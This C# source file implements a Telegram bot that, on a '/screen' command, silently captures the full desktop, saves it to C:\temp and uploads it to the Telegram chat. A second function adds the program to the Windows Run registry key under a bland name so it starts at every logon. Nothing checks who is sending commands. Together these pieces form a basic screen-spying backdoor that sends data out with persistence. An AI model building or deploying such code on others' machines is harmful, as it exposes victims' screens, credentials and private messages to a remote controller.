using Microsoft.Win32;
using Telegram.Bot.Types;
using Telegram.Bot;
using System.Drawing.Imaging;
using Microsoft.Win32;

namespace BotTG
{
    public class Functions
    {
        public async static Task Update(ITelegramBotClient client, Update update, CancellationToken token)
        {
            var message = update.Message;

            if (message.Text != null)
            {
                if (message.Text == "/start")
                {
                    await client.SendTextMessageAsync(message.Chat.Id, "Бот стартанул!");
                    return;
                }
                if (message.Text == "/help")
                {
                    await client.SendTextMessageAsync(message.Chat.Id, "1. Отправить скриншот экрана (/screen)\n" +
                                                                       "2. Soon..");
                }
                if (message.Text == "/screen")
                {
                    MakeScreenshot();
                    string mypath = @"C:\\Temp\\screenshot_01.jpg";
                    var dat = DateTime.Now;
                    using (var fileStream = new FileStream(mypath, FileMode.Open, FileAccess.Read, FileShare.Read))
                    {
                        await client.SendPhotoAsync(
                            chatId: message.Chat.Id,
                            photo: new InputFileStream(fileStream),
                            caption: dat.ToString("dd/MM/yyyy")
                        );
                    }
                }
            }
        }
        public static void MakeScreenshot()
        {
            // получаем размеры окна рабочего стола
            Rectangle bounds = Screen.GetBounds(Point.Empty);

            // создаем пустое изображения размером с экран устройства
            using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                // создаем объект на котором можно рисовать
                using (var g = Graphics.FromImage(bitmap))
                {
                    // перерисовываем экран на наш графический объект
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                // сохраняем в файл с форматом JPG
                bitmap.Save(@"C:\\temp\\screenshot_01.jpg", ImageFormat.Jpeg);
            }
        }

        const string name = "MyTestApplication";
        public static bool SetAutorunValue(bool autorun)
        {
            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");

            try
            {
                if (autorun == true)
                    reg.SetValue(name, ExePath);
                else
                    reg.DeleteValue(name);

                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }

    }
}
